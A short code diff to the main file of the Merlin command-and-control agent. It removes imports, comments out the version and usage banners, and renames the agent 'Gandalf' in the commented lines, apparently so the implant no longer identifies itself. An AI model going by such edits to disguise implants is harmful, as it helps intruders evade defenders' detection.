@@ -20,14 +20,13 @@ package main
 import (
 	// Standard
 	"flag"
-	"fmt"
 	"os"
 
 	// 3rd Party
 	"github.com/fatih/color"
 
 	// Merlin
-	merlin "github.com/Ne0nd0g/merlin/pkg"
+
 	"github.com/Ne0nd0g/merlin/pkg/agent"
 )
 
@@ -54,8 +53,8 @@ func main() {
 	flag.Parse()
 
 	if *version {
-		color.Blue(fmt.Sprintf("Merlin Agent Version: %s", merlin.Version))
-		color.Blue(fmt.Sprintf("Merlin Agent Build: %s", build))
+		//color.Blue(fmt.Sprintf("Gandalf Agent Version: %s", merlin.Version))
+		//color.Blue(fmt.Sprintf("Gandalf Agent Build: %s", build))
 		os.Exit(0)
 	}
 
@@ -78,7 +77,7 @@ func main() {
 
 // usage prints command line options
 func usage() {
-	fmt.Printf("Merlin Agent\r\n")
-	flag.PrintDefaults()
+	//fmt.Printf("Merlin Agent\r\n")
+	//flag.PrintDefaults()
 	os.Exit(0)
 }
